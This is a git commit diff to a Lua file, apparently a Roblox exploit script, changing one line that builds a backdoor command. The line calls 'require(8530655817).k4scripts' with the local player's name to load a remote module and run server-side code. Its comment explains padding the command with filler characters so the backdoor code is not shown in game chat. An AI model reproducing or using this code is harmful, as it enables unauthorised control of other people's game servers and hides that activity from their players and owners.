0b72d6fe4ad468f00c3860b785ae8856a133f5af
xhayper <hayper1919@gmail.com>
2022-01-26 20:20:31 +0700

    Update source.lua

--- source.lua
+++ source.lua
@@ -28,7 +28,7 @@ local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local requireScript = ("require(8530655817).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", (200 * 6)*2)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
+local requireScript = ("require(8530655817).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
 local invCode = "6HndYgC"
 
 local alternativeSS = {
